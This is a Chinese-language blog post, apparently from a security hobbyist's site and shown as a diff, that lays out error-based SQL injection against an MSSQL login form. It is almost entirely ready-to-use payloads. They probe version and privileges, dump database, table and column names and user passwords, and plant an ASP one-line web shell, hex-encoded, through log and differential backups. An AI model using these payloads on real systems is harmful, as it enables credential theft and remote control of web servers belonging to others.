@@ -1,0 +1,91 @@
+MSSQL登录框显错注入
+四月五日，由admin 2012年没有收到任何评论?
+作者：bugcx或 | bugcx的博客|关注网络安全
+（撸一撸）
+
+
+?
+是否支持多语句
+';declare @x int--
+ 
+版本
+ 
+' and @@version>0--
+ 
+当前用户<span class="wp_keywordlink"><a href="http://blog.bug.cx/tag/权限/" title="权限" rel="nofollow" target="_blank">权限</a></span>
+ 
+' and system_user>0--
+ 
+是否站库分离
+ 
+' and @@servername+'|'+host_name()>0--
+ 
+判断数据库<span class="wp_keywordlink"><a href="http://blog.bug.cx/tag/权限/" title="权限" rel="nofollow" target="_blank">权限</a></span>
+ 
+1' and ltrim(is_srvrolemember('sysadmin'))+'a'>0--
+ 
+將 varchar 值 '0a' 轉換成資料類型 int 時，轉換失敗。说明当前用户不是sysadmin角色组成员
+ 
+1' and ltrim(is_member('db_owner'))+'a'>0--
+ 
+將 varchar 值 '1a' 轉換成資料類型 int 時，轉換失敗。db<span class="wp_keywordlink"><a href="http://blog.bug.cx/tag/权限/" title="权限" rel="nofollow" target="_blank">权限</a></span>
+ 
+1' and ltrim(is_member('public'))+'a'>0--
+ 
+將 varchar 值 '1a' 轉換成資料類型 int 時，轉換失敗。public权限
+ 
+1' and db_name()>0--
+ 
+1' order by 21--
+ 
+爆库
+ 
+' and (select top 1 isnull(cast([name] as nvarchar(500)),char(32))+char(124) from [master].[dbo].[sysdatabases] where dbid in (select top N dbid from [master].[dbo].[sysdatabases] order by dbid desc))=0--
+ 
+爆表
+ 
+and (select top 1 cast(name as varchar(200)) from (select top N name from 数据库名.sys.all_objects where type=char(85) order by name) t order by name desc)=0--
+ 
+' and (select top 1 name from CLSMIS.dbo.sysobjects where xtype='U')>0--
+ 
+' and (select top 1 name from CLSMIS.dbo.sysobjects where xtype='U' and name not in ('表1'))>0--
+ 
+' and (select top 1 name from CLSMIS.dbo.sysobjects where xtype='U' and name not in ('表1','表2'))>0--
+ 
+and name not in ('xxx',
+ 
+爆字段
+ 
+' and (select top 1 name from syscolumns where id in (select id from sysobjects where type = 'u' and name = '表名'))>0--
+ 
+' and (select top 1 name from syscolumns where id in (select id from sysobjects where type = 'u' and name = '表名') and name not in ('字段1','字段2'))>0--
+ 
+爆数据
+ 
+' and (select top 1 USR_NAME from 表名 where USR_ID=1)<0--
+ 
+' and (select top 1 PASSWD from 表名 where USR_ID=1)>0--
+ 
+log备份
+ 
+' ;alter database 库名 set RECOVERY FULL--
+ 
+' ;create table cmd (a image)--
+ 
+' ;backup log 库名 to disk = 'c:\cmd' with init-- 
+ 
+' ;insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E)--
+ 
+' ;backup log 库名 to disk = 'E:\FIRE\xx.asp'--
+ 
+;drop table cmd--
+ 
+3步差异备份
+ 
+' ;backup database CRSHGC to disk = 'c:\<span class="wp_keywordlink"><a href="http://blog.bug.cx/tag/windows/" title="windows" rel="nofollow" target="_blank">windows</a></span>\sb.bak';-- 
+ 
+' ;create table [dbo].[dtest] ([cmd] [image]); insert into dtest(cmd) values(0x3C25657865637574652872657175657374282261222929253E);-- 
+ 
+' ;backup database CRSHGC to disk='E:\FIRE\\xx.asp' WITH DIFFERENTIAL,FORMAT;-- 
+ 
+一句话密码a
